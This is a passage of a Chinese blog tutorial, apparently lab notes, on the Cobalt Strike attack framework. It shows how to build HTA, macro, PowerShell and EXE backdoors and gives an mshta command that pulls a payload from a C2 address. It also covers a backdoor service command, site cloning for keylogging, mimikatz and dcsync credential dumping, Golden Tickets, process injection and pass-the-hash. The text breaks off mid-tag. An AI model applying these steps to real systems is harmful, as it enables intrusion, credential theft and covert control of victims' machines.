反向连接代理，它允许攻击者在目标系统上执行命令、窃取数据、横向移动等操作。Beacon 一般会在目标主机上持续运行，并周期性地与 C2 服务器通信以接收命令。[<strong>其中的反向代理连接是目标主机主动去连接到c2服务器上</strong>]</p><p><strong>Stager</strong> 是攻击过程中的一个初步阶段，通常指的是一种 <strong>小型的载荷</strong>，它的任务是<strong>从目标主机启动并下载&#x2F;执行更复杂的 payload（比如 Beacon）</strong>。</p><p><strong>Beacon 的通信流程</strong></p><ol><li><strong>部署</strong>：<ul><li>攻击者通过社工攻击、漏洞利用等方式在目标系统上部署 Beacon 或 Stager。</li></ul></li><li><strong>连接 C2</strong>：<ul><li>Beacon 启动后，会根据 Listener 配置尝试与 C2 地址（HTTP Hosts）建立通信。</li><li>具体端口和请求行为由 Profile 决定。</li></ul></li><li><strong>接收指令</strong>：<ul><li>C2 会向 Beacon 发送任务指令（如执行命令、收集信息、横向移动等）。</li></ul></li><li><strong>数据上传</strong>：<ul><li>Beacon 收集到目标系统的信息后，将其加密并通过 HTTP POST 上传至 C2。</li></ul></li><li><strong>持久性</strong>：<ul><li>Beacon 可以通过定时通信（Sleep Interval）保持低频率活动，减少被检测的风险。</li></ul></li></ol><h2 id="创建攻击Attacks（生成后门）"><a href="#创建攻击Attacks（生成后门）" class="headerlink" title="创建攻击Attacks（生成后门）"></a>创建攻击Attacks（生成后门）</h2><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411202006854.png" alt="image-20241120200609719"></p><h2 id="Attacks种类以及使用"><a href="#Attacks种类以及使用" class="headerlink" title="Attacks种类以及使用"></a>Attacks种类以及使用</h2><p><strong>HTA文档：</strong>生成一个恶意HTML Application木马，后缀格式为.hta。通过HTML调用其他语言的应用组件进行攻击，提供了可执行文件 、PowerShell、VBA三种方法。</p><p><strong>office宏：</strong>生成office宏病毒文件;[用的不多大部分已失效，因为目前国内的office或者WPS中默认将宏关闭]</p><p><strong>Payload生成器：</strong>生成各种语言版本的payload，可以生成基于C、C#、COM Scriptlet、Java、Perl、PowerShell、Python、Ruby、VBA等的payload</p><p><strong>Windows可执行程序：</strong>生成32位或64位的exe和基于服务的exe、DLL等后门程序</p><p><strong>Windows Executable(S)：</strong>用于生成一个exe可执行文件，其中包含Beacon的完整payload，不需要阶段性的请求。与Windows Executable模块相比，该模块额外提供了代理设置，以便在较为苛刻的环境中进行渗透测试。该模块还支持powershell脚本，可用于将Stageless Payload注入内存</p><h3 id="实践："><a href="#实践：" class="headerlink" title="实践："></a>实践：</h3><h4 id="HTA文档："><a href="#HTA文档：" class="headerlink" title="HTA文档："></a>HTA文档：<img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411211949669.png" alt="image-20241121194903569"></h4><p>在选择使用哪种方式生成hta文件的时候是根据目标主机的环境所决定的。如果环境不合适可能会导致脚本执行错误。</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411212233398.png" alt="image-20241121223319354"></p><h4 id="上线步骤："><a href="#上线步骤：" class="headerlink" title="上线步骤："></a>上线步骤：</h4><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411212051506.png" alt="屏幕截图 2024-11-21 194205"></p><p>生成hat文件后将其部署到c2服务器上[原因：可以]</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411212051460.png" alt="屏幕截图 2024-11-21 200609"></p><p>然后在目标主机上使用命令：mshta <a href="http://192.168.6.127/file.ext">http://192.168.6.127:80/file.ext</a>  至于为什么使用这个命令而不是直接下载hta文件是因为这样的隐蔽性更高一点</p><p>mshta是win上自带的专门用于运行 HTML 应用程序的工具，它直接解析文件内容，而不会考虑文件扩展名；这也是为什么如果直接访问<a href="http://192.168.6.127/file.ext%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%8B%E8%BD%BD%E7%9A%84%E6%98%AFext%E6%96%87%E4%BB%B6%E4%BD%86%E6%98%AF%E5%A6%82%E6%9E%9C%E4%BD%BF%E7%94%A8mshta%E6%9D%A5%E8%AE%BF%E9%97%AE%E5%8D%B4%E4%BC%9A%E6%8C%89%E7%85%A7hat%E6%96%87%E4%BB%B6%E5%8E%BB%E6%89%A7%E8%A1%8C%E7%9A%84%E5%8E%9F%E5%9B%A0">http://192.168.6.127:80/file.ext浏览器下载的是ext文件但是如果使用mshta来访问却会按照hat文件去执行的原因</a></p><p>如果直接通过url去访问会下载文件file.ext浏览器会根据文件扩展名来下载文件导致下载下来的文件为file.ext</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411212154480.png" alt="image-20241121215440313"></p><p>成功上线：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411212227959.png" alt="image-20241121222748891"></p><h4 id="office宏：-使用较少"><a href="#office宏：-使用较少" class="headerlink" title="office宏：(使用较少)"></a><strong>office宏：</strong>(使用较少)</h4><p>[生效前提：WPS或者world的禁用宏关掉]</p><p>是通过设成office宏病毒文件，当目标主机接收到这个文件并且他的world或者wps没有禁用宏  如果目标主机打开这个文件目标主机就会上线。</p><h4 id="上线步骤：-1"><a href="#上线步骤：-1" class="headerlink" title="上线步骤："></a>上线步骤：</h4><p>直接点击office宏然后选择监听的目标主机即可</p><p>然后点击Copy Macro</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411221624470.png" alt="屏幕截图 2024-11-22 155137"></p><p>然后点点击视图创建一个宏</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411221625593.png" alt="屏幕截图 2024-11-22 155243"></p><p>自定义一个宏的名字</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411221626871.png" alt="屏幕截图 2024-11-22 155640"></p><p>将之前Copy的宏复制到里面并保存</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411221626946.png" alt="屏幕截图 2024-11-22 155358"></p><p>然后将这个world文档发送给目标主机</p><p>当目标主机打开这个文件时 cs显示成功上线</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411221630163.png" alt="屏幕截图 2024-11-22 161120"></p><p>但是注意；成功上线的前提是要先把WPS或者world的禁用宏关掉</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411221631797.png" alt="屏幕截图 2024-11-22 155516"></p><h4 id="Payload生成器："><a href="#Payload生成器：" class="headerlink" title="Payload生成器："></a>Payload生成器：</h4><p>这个模块用于生成各个语言版本的shellcode，然后使用其他语言进行编译生成[<strong>生成的shellcode可以嵌入到其他语言的程序中进行封装和利用</strong>。]</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411221656292.png" alt="image-20241122165619216"></p><p>这里主要说两个payload：Powershell和Powershell Command。两个都是利用Powershell进行上线。[一个是执行完整的powershell脚本一个是执行powershell命令]</p><h4 id="上线步骤：-2"><a href="#上线步骤：-2" class="headerlink" title="上线步骤："></a>上线步骤：</h4><h5 id="Powershell："><a href="#Powershell：" class="headerlink" title="Powershell："></a>Powershell：</h5><p>执行方式  在powershell下：[有的PowerShell 的 <strong>执行策略</strong>会限制脚本的运行]</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Import-Module .\payload<span class="hljs-selector-class">.ps1</span>      作用：将 payload<span class="hljs-selector-class">.ps1</span> 文件作为一个 PowerShell 模块 导入。<br>或<br>. .\payload<span class="hljs-selector-class">.ps1</span>                  作用：直接执行 payload<span class="hljs-selector-class">.ps1</span> 文件中的代码，并将其中的内容加载到当前作用域。<br><br><br><br>第一个 . 是 Dot Sourcing 的符号，表示将脚本的内容加载到当前作用域。<br>第二个 .\ 指向当前目录中的脚本文件。<span class="hljs-selector-attr">[在powershell中.\才是指当前目录下的文件  而./是linux的shell中常用的表示这个意义的符号]</span><br><br></code></pre></td></tr></table></figure><p>在cmd下：</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs coq">powershell <span class="hljs-keyword">Import</span>-<span class="hljs-keyword">Module</span> .\payload.ps1<br>或<br>powershell .\payload.ps1<br></code></pre></td></tr></table></figure><h5 id="Powershell-Command"><a href="#Powershell-Command" class="headerlink" title="Powershell Command:"></a>Powershell Command:</h5><p>直接把生成的命令粘贴到powershell中执行即可上线</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411221819589.png" alt="image-20241122181916443"></p><p> <strong>PowerShell 脚本（Payload）</strong> 还是 <strong>PowerShell Command（Payload）</strong>，<strong>一旦关闭 PowerShell 会话，所有在内存中的状态、变量和临时创建的对象都会被清除</strong>。但是，如果脚本或命令执行了持久化操作（如写入文件、注册表项或启动持久化进程），这些影响会在会话结束后依然存在。</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411271113430.png" alt="image-20241127111328659"></p><p>其中的raw所生成的可执行文件是bin文件</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411271756983.png" alt="image-20241127175647808"></p><h4 id="Windows可执行程序-E-Windows可执行程序-Stageless）的区别"><a href="#Windows可执行程序-E-Windows可执行程序-Stageless）的区别" class="headerlink" title="Windows可执行程序(E)&amp;&amp;Windows可执行程序(Stageless）的区别"></a>Windows可执行程序(E)&amp;&amp;Windows可执行程序(Stageless）的区别</h4><p>  这两个模块直接用于生成可执行的exe 文件或dll 文件。Windows Executable是生成Stager类型的马，而<br>Windows Executable(S)是生成Stageless类型的马。那stager和stageless有啥区别呢？</p><ul><li><p>Stager是分阶段传送PayloaI 分阶段啥意思呢?就是我们生成的Stager马其实是一个小程序，用于从服务器端下载我们真正的shellcode。分阶段在很多时候是很有必要的，因为很多场景对于能加载进内存并成功漏洞利用后执行的数据大小存在严格限制。所以这种时候，我们就不得不利用分阶段传送了。</p></li><li><p>而Stageless是完整的木马，后续不需要再向服务器端请求shellcode。所以使用这种方法生成的木马会比Stager生成的木马体积要大。<strong>但是这种木马有助于避免反溯源</strong>，因为如果开启了分阶段传送，任何人都能连接到你的C2服务器请求payload，并分析payload中的配置信息。在Cobaltstrike4.0及以后的版本中，后渗透和横向移动绝大部分是使用的stageless类型的木马。</p></li><li><p>Windowss Executable(S)相比于Windows Executable，其中包含Beacon的完整pavload，不需要阶段性的请求</p><p>该模块额外提供了代理设置，以便在较为苛刻的环境中进行渗透测试。该模块还支持powershell脚本，可用于将</p><p>StagelessPayload注入内存</p></li></ul><table><thead><tr><th>特性</th><th align="left"><strong>Windows 可执行程序 (E)</strong></th><th><strong>Windows 可执行程序 (Stageless)</strong></th></tr></thead><tbody><tr><td><strong>负载阶段</strong></td><td align="left">分阶段（Loader[指加载器] 和主负载）首先把Loader传到目标主机 然后依赖Loader加载位于C2服务器上的主负载</td><td>单阶段（完整负载）直接完整的主负载直接嵌入到生成的可执行文件中，无需依赖额外的下载过程</td></tr><tr><td><strong>网络依赖</strong></td><td align="left">必须与 C2 服务器通信[要从C2服务器上下载主负载]</td><td>无需网络连接即可运行单次上传成功即可</td></tr><tr><td><strong>文件大小</strong></td><td align="left">通常较小第一次攻击者主动上传的文件[Loader]较小</td><td>通常较大[攻击者直接上传含有主负载的可执行文件]</td></tr><tr><td><strong>执行速度</strong></td><td align="left">依赖网络环境[因为目标主机要从C2服务器上下载主负载]</td><td>更快[只需单次上传无网络延迟]</td></tr><tr><td><strong>检测难度</strong></td><td align="left">初始文件难检测，<strong>行为易检测</strong>                                                                                             但是比较容易更新，可以通过改变C2服务器上的主负载来执行不同的任务 动态加载主负载，便于调整和更新 常用于持久化植入或大规模网络环 境</td><td><strong>静态文件易检测</strong>，无网络行为                                       只适合特定目标的单次攻击[一次性攻击]</td></tr><tr><td><strong>适用环境</strong></td><td align="left">网络连接良好</td><td>无网络连接或需快速执行</td></tr></tbody></table><h5 id="对于其中的Windows-Service-EXE"><a href="#对于其中的Windows-Service-EXE" class="headerlink" title="对于其中的Windows Service EXE"></a>对于其中的Windows Service EXE</h5><p>它生成的木马直接双击执行是无法返回session的，需要以创建服务的方式启动才会返回session</p><p>注：要先创建服务然后启动服务 只有启动服务后目标主机才能上线    而且这种操作**<u>需要管理员权限</u>**才能够执行</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">#注意，等号后面要有空格</span><br><span class="hljs-built_in">sc</span> create autoRunBackDoor binPath= <span class="hljs-string">&quot;cmd,exe /c C:\users\win7\desktopcs.exe&quot;</span> <span class="hljs-built_in">start</span>= auto DispTayName=autoRunBackDoor<br><br><span class="hljs-comment">#第一个autoRunBackDoor是服务的内部名称（ServiceName），你用它来在命令行或脚本中管理服务。</span><br><span class="hljs-comment">#第二个autoRunBackDoor是DisplayName，这是你在 Windows 服务管理工具中看到的名称，用于管理员识别服务。</span><br><br><span class="hljs-comment">#开启某个系统服务</span><br><span class="hljs-built_in">sc</span> <span class="hljs-built_in">start</span> autoRunBackDoor<br><span class="hljs-comment">#停止某个系统服务</span><br><span class="hljs-built_in">sc</span> stop autoRunBackDoor<br><span class="hljs-comment">#删除某个系统服务</span><br><span class="hljs-built_in">sc</span> delete servicename<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411282147356.png" alt="image-20241128214736109"></p><h4 id="创建Attacks（钓鱼攻击）"><a href="#创建Attacks（钓鱼攻击）" class="headerlink" title="创建Attacks（钓鱼攻击）"></a>创建Attacks（钓鱼攻击）</h4><ul><li><p><strong>克隆网站</strong>可以记录受害者提交的数据;</p></li><li><p><strong>文件下载</strong>提供一个本地文件下载，可以修改Mime信息。</p></li><li><p><strong>Scripted Web Delivery(S)</strong>基于Web的攻击测试脚本，自动生成可执行的payload，通常用这个模块来生</p><p>成powershell命令反弹shell</p></li><li><p><strong>签名Applet攻击</strong>启动一个Web服务以提供自签名lava Applet的运行环境</p></li><li><p><strong>智能攻击</strong>自动检测java版本并利用已知的exploits绕过security;</p></li><li><p><strong>信息搜集</strong>用来获取一些系统信息，比如系统版本，Flash版本，浏览器版本等</p></li></ul><h4 id="克隆网站"><a href="#克隆网站" class="headerlink" title="克隆网站"></a>克隆网站</h4><p>使用该模块来克隆下一个网站然后获取用户的键盘记录<img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411282213334.png" alt="image-20241128221338247"></p><p>将你想要克隆的网站填进去然后可以勾选一下然后会给你一个url样子就是你所克隆的网站</p><p> <img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202411282215105.png" alt="image-20241128221551843"></p><p>然后在视图中的web日志中即可看到一些相关的操作日志</p><h1 id="三、CS对被控主机的操作"><a href="#三、CS对被控主机的操作" class="headerlink" title="三、CS对被控主机的操作"></a>三、CS对被控主机的操作</h1><h2 id="View（视图）"><a href="#View（视图）" class="headerlink" title="View（视图）"></a>View（视图）</h2><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502041118860.png" alt="image-20250204111821746"></p><p>图片中便是一些我们可以查看的一些信息解释如下：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502041119326.png" alt="image-20250204111932270"></p><h3 id="一些简单基础的操作须知"><a href="#一些简单基础的操作须知" class="headerlink" title="一些简单基础的操作须知"></a>一些简单基础的操作须知</h3><p>会话交互操作：<img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502041549607.png" alt="image-20250204154946465"></p><p>在执行常规的系统指令的时候需要先在命令前加上shell 例如：shell ipconfig</p><p>为了攻击行为的隐蔽性cs默认交互间隔时间为1min自己在进行测试的时候可以手动把回连间隔调小一点</p><p>在进行文件浏览操作的时候如果不进行任何其他操作所看到的文件夹只能是木马程序所在的根目录下（根盘符）的所有文件</p><p>在查看屏幕截图的时候操作如下：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502041655111.png" alt="屏幕截图 2025-02-04 165212"></p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502041655579.png" alt="屏幕截图 2025-02-04 165227"></p><p>注意在进行屏幕截图的时候只是针对普通用户（因为普通用户才有正常的操作界面system用户是没有的）</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502041801175.png" alt="image-20250204180158965"></p><p>提权大都是利用漏洞来进行的所以如果目标主机不存在这个漏洞提权操作是肯定不成功的</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502041803656.png" alt="image-20250204180349563"></p><h2 id="抓取hash和dump明文密码"><a href="#抓取hash和dump明文密码" class="headerlink" title="抓取hash和dump明文密码"></a>抓取hash和dump明文密码</h2><p>执行这两个操作一般都有需要有管理员权限需要提权</p><p>有了这两个东西后比较方便后续例如横向移动等等的操作</p><p>抓取Hash值</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502051338507.png" alt="image-20250205133832376"></p><p>获取明文密码</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502051339686.png" alt="image-20250205133943605"></p><p>提取成功后我们可以查看获取到的凭证信息</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502051340342.png" alt="image-20250205134004255"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502041828533.png" alt="image-20250204182852435"></p><p>可以自己去网上找一些提权脚本（注意对应的脚本要适用于当前的测试环境不然肯定提权失败）</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502041830218.png" alt="image-20250204183043169"></p><h2 id="控主机建立Socks4代理"><a href="#控主机建立Socks4代理" class="headerlink" title="控主机建立Socks4代理"></a>控主机建立Socks4代理</h2><p>当我们控制的主机是一台位于公网和内网边界的服务器，我们想利用该主机继续对内网进行渗透，于是，我们可<br>以利用CS建立socks4A代理。</p><h3 id="1-内网访问控制的绕过"><a href="#1-内网访问控制的绕过" class="headerlink" title="1. 内网访问控制的绕过"></a>1. <strong>内网访问控制的绕过</strong></h3><ul><li><strong>内网隔离</strong>：通常，内网与外网之间通过防火墙、路由器、NAT（网络地址转换）等设备进行隔离，限制外部访问内网。通过在外网中找到一个具有公网 IP 的服务器（通常是 DMZ 区域的主机），你可以在公网和内网之间建立一个 <strong>中转站</strong>，绕过内网的访问控制。</li><li><strong>NAT 和防火墙绕过</strong>：内网的设备通常通过 NAT 或防火墙与外界进行通信，而外部设备无法直接访问内网的主机。SOCKS4A 代理使得攻击者能够通过已经控制的边界主机访问内网资源，而无需直接暴露内网主机。</li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">DMZ</span> 区域的主机指的是部署在内网与外网之间的服务器，这些主机通常负责公开服务。通过 DMZ，外部用户可以访问公开的服务（如 Web 服务器、邮件服务器），但这些服务与内网资源隔离，减少了内网直接暴露在外部的风险。DMZ 是 多层防御 的一部分，能有效提升网络安全性，保护内网免受外部攻击。<br></code></pre></td></tr></table></figure><h3 id="2-利用-CS-构建-SOCKS4A-代理"><a href="#2-利用-CS-构建-SOCKS4A-代理" class="headerlink" title="2. 利用 CS 构建 SOCKS4A 代理"></a>2. <strong>利用 CS 构建 SOCKS4A 代理</strong></h3><ul><li><strong>Cobalt Strike（CS）</strong> 是一个常用于渗透测试和红队活动的工具，它提供了 <code>SOCKS4A</code> 代理功能，允许用户通过被控制的主机将网络流量转发到目标内网。</li><li><strong>SOCKS4A</strong> 是 SOCKS 协议的一种变体，它支持通过代理服务器将目标主机的 IP 地址和端口隐匿，适用于绕过防火墙和 NAT。SOCKS4A 代理不仅可以将流量转发，还允许在目标主机中建立与其他内网主机的连接，这对于攻击者非常有用。</li></ul><h3 id="3-隐蔽性"><a href="#3-隐蔽性" class="headerlink" title="3. 隐蔽性"></a>3. <strong>隐蔽性</strong></h3><ul><li>通过 SOCKS4A 代理，攻击者的网络流量看起来像是从已控制的中转主机发出的，而不是直接从外部发出。这样可以隐藏攻击者的真实来源，增加攻击的隐蔽性。</li><li>通过 SOCKS4A 代理，所有的内部访问都通过受信任的边界主机，这可以避开内网防火墙、IDS（入侵检测系统）和 IPS（入侵防御系统）的警报。</li></ul><h2 id="进程列表-注入进程，键盘监控"><a href="#进程列表-注入进程，键盘监控" class="headerlink" title="进程列表(注入进程，键盘监控)"></a>进程列表(注入进程，键盘监控)</h2><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502041841672.png" alt="image-20250204184159581"></p><p>在进行进程注入的时候建议注入的进程号比木马程序的进程号大（成功率高）</p><p>原因：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs">选择 较大 PID 的进程 作为注入目标的原因，主要是基于以下几点：<br>1较新的进程通常更容易被操作系统和安全工具接受，因为它们的内存布局较为独立，且没有被其他进程占用。<br>2较小的 PID 通常对应于系统级进程，这些进程受保护机制和安全工具的监控较多，注入成功的难度更高。<br>3选择较大 PID 的进程可以避免与其他已运行进程的内存冲突，降低注入失败的概率。<br>因此，为了提高进程注入的 成功率，选择注入较大 PID 的进程是一种较为常见的策略。<br></code></pre></td></tr></table></figure><p>操作如图：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502041854185.png" alt="屏幕截图 2025-02-04 185308"></p><p>可以发现回来了一个会话 如图：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502041855111.png"></p><p>（注意：在进行权限注入的时候首选低权限运行的程序进程进行注入这样注入成功率比较高）</p><p>选中该进程，Kill为杀死该进程，Refresh为刷新该进程，Inject 则是把beacon注入进程，Log Keystrokes为键盘记录，screenshot 为截图，stea Token为窃取运行指定程序的用户令牌</p><h2 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h2><p>任意选择一个进程，点击Log Keystrokes键，即可监听该主机的键盘记录</p><p>操作如图：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502042015300.png" alt="屏幕截图 2025-02-04 201104"></p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502042015958.png" alt="屏幕截图 2025-02-04 201137"></p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502042015642.png" alt="屏幕截图 2025-02-04 201151"></p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502042017957.png" alt="image-20250204201746883">如上图可得到键盘输入的记录；</p><h2 id="生成黄金票据注入当前会话（Golden-Ticket）"><a href="#生成黄金票据注入当前会话（Golden-Ticket）" class="headerlink" title="生成黄金票据注入当前会话（Golden Ticket）"></a>生成黄金票据注入当前会话（<strong>Golden Ticket</strong>）</h2><p>生成黄金票据的前提是我们已经获得krbtgt用户的哈希并且已经获一个以域用户登录的主机权限</p><p>（<u>krbtgt 账户是一个专门用于 Kerberos 身份验证的账户。它的哈希值用于加密和生成 Kerberos 票证（TGT）。如果攻击者获取到该哈希值，可能会导致严重的安全风险，例如 <strong>Golden Ticket</strong> 攻击。</u>）</p><p>注：krbtgt用户是默认存在的不需要再额外去配置</p><p>【由于现阶段我的学习进度还不知道如何横向移动到域控上执行命令获取krbtgt用户的一些相关信息所以我直接选择去到我的域控的虚拟机上跑<a href="https://github.com/ParrotSec/mimikatz">mimikatz</a>来获取krbtgt 账户的一些信息（**<code>mimikatz</code>**可以从内存中提取明文密码、哈希、PIN 码和 Kerberos 票证。）】</p><p>操作如图：</p><p>首先查看这个域控上存在krbtgt这个用户</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502082115649.png" alt="屏幕截图 2025-02-08 190716"></p><p>然后运行mimikatz（相关的一些命令在下图中可以看到   以mimikatz开头的#后的就是要用到的命令）注：使用这个工具获取krbtgt用户的信息需要以管理员的权限运行</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502082116453.png" alt="屏幕截图 2025-02-08 190738"></p><p>然后结果会存放到这个exe同级目录下的mimikatz文档中</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502082121928.png" alt="屏幕截图 2025-02-08 190756"></p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502082121964.png" alt="屏幕截图 2025-02-08 190805"></p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502082108577.png" alt="image-20250208210815312"></p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502051619929.png" alt="image-20250205161909875"></p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502051619047.png" alt="image-20250205161916005"></p><p>其中的</p><p>User：是我们要伪造的用户名一般我们填administrator</p><p>Domain：域名</p><p>Domain SID：域SID</p><p>krbtgr Hash：krbtgt用户的hash</p><p>在相关的信息输入完成后点击build然后显示注入成功</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502082125252.png" alt="image-20250208212517163"></p><p>然后通过命令：<code>dir \\dc\c$ </code>用于列出名为 <code>dc</code> 的远程计算机上的 <code>C:</code> 驱动器的内容（也就是在同一个域的其他的计算机中的c盘里的东西——横向移动）通过伪造的黄金票据实现</p><p>注意使用这条命令的时候<strong>前提</strong>是远程计算机必须<strong>处于开机状态</strong>且你正在使用的这台主机和远程计算机之间网络可达才行</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502091050307.png" alt="image-20250209104959184"></p><h3 id="问题解决："><a href="#问题解决：" class="headerlink" title="问题解决："></a>问题解决：</h3><p>对于这条命令的成功执行我个人遇到点阻力，老是报错说拒绝访问首先我查看了一下域控的文件共享设置然后全部开启如图：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502091053201.png" alt="image-20250209105327138"></p><p>然后问题并没有解决还是拒绝访问然后我尝试使用命令<strong>shell klist purge</strong>来清除缓存的黄金票据又重新生成了一份然后就成功解决了。</p><p><strong>获取域中其他主机名的方法：net view</strong></p><p><code>net view</code>查看当前<strong>域内主机</strong></p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502051654469.png" alt="image-20250205165422398"></p><p>查看当前用户缓存的票据：shell klist</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502082126934.png" alt="image-20250208212647855"></p><p>然后可以使用命令<code>mimikatz lsadump::dcsync /domain:ad.com /all /csv</code>导出域内所有用户的哈希了（注意空格）</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502111332584.png" alt="image-20250211133222402"></p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>操作如图</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502111338642.png" alt="image-20250211133835544"></p><p>其中的最大线程数我们一般是选择200</p><p><strong>ARP</strong>：使用地址解析协议来发现同一局域网内的活跃设备。</p><p><strong>ICMP</strong>：通过发送 Ping 请求测试目标主机是否可达。</p><p><strong>None</strong>：不进行任何主机发现，直接扫描指定的地址和端口。</p><p>以上不同的选项对应不同的主机发现方法 如果选none的话（不进行主机探活）就默认所有主机都是存活状态</p><p>扫描结果会直接输出在控制台如图：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502111403565.png" alt="image-20250211140344453"></p><p>或者选择一种更为直接的方法 点击视图一&gt;目标，就会出现网段中存活的主机。(这是通过端口扫描下测到的结果显示的，要想这里显示必须得先进行扫描端口或者手动添加)<br><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502111408402.png" alt="image-20250211140859238"></p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502111410949.png" alt="image-20250211141022884"></p><p>然后如果有类似任务我们想要停掉它可以先使用命令<code>jobs</code>列出任务然后使用<code>jobkill [JID]</code>即可</p><p>操作如图：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502111353588.png" alt="image-20250211135353522"></p><h2 id="Hash传递攻击或ssh远程登录"><a href="#Hash传递攻击或ssh远程登录" class="headerlink" title="Hash传递攻击或ssh远程登录"></a>Hash传递攻击或ssh远程登录</h2><p>在进行上一步的端口扫描发现主机后我们可以利用hash传递攻击和ssh远程登录来进行横向移动</p><p>如图：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502111452708.png" alt="image-20250211145212609"></p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502111452529.png" alt="image-20250211145240470"></p><p>点击Launch后如图返回shell成功（以下第二张照片中的白色的那一行就是成功返回来的shell）</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502111504867.png" alt="image-20250211150403749"></p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202502111504155.png" 